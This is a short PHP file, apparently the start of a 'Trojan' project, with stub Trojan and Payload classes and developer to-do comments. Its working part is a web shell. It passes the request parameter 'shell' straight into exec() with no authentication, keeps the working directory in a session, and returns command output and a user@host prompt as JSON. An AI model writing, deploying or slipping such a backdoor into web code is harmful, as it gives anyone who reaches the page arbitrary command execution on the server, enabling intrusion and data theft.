<?php

// @todo: DON'T FORGET TO SEND THE SPECIAL AJAX HEADER HERE
// @todo: probably need to track some kind of options hash over here
// @todo: it would be awesome to build a compatiblity layer for programs like 
// top that don't (I don't think) write to stdout
// @note @todo: all trojans should support some kind of "help" command to show
// you what payloads they're carrying
// @todo: it would be rad as hell if I could get tab-completion to work

class Trojan{
    public $payloads = array();
    public $options = array();

    public function help(){
        return 'help';
    }

}

class Payload{
    public $description = 'A description of the payload goes here.';
    public $options = array();

    public function execute(){
        return 'hacked';
    }

}

// use sessions for some conveniences, like preserving the CWD
session_start();

$cwd = '.';
if(isset($_SESSION['cwd'])){
    $cwd = $_SESSION['cwd'];
}


// generate the output
$output = array();

$command = "cd $cwd; " . $_REQUEST['shell'] . " 2>&1; pwd";
exec($command, $output);
$cwd = array_pop($output);
$output = join($output, "\n");

// assemble the prompt context
$whoami          =  trim(`whoami`);
$hostname        =  gethostname();
$line_terminator =  ($whoami ===  'root') ? '#' : '$' ;
$prompt_context  =  "{$whoami}@{$hostname}:$cwd{$line_terminator}";

// also need to redirect stderr to stdout
$error = '';
$response = array(
    'prompt_context' => $prompt_context,
    'output'         => $output,
    'error'          => $error,
);

// save the cwd
$_SESSION['cwd'] = $cwd;

$json = json_encode($response);
echo $json;
    
die();
